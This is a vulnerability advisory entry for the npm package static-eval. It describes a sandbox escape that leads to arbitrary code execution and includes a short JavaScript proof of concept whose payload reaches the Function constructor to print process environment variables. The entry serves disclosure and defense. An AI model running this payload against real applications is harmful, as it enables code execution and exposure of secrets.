- id: npmjs:npm:static-eval:758
  title: Sandbox Breakout / Arbitrary Code Execution
  description: |-
    All versions of `static-eval` pass untrusted user input directly to the global function constructor, resulting in an arbitrary code execution vulnerability when user input is parsed via the package.

    ## Proof of concept
    ```
    var evaluate = require('static-eval');
    var parse = require('esprima').parse;

    var src = process.argv[2];
    var payload = '(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()'
    var ast = parse(payload).body[0].expression;
    console.log(evaluate(ast, {x:1}));
    ```
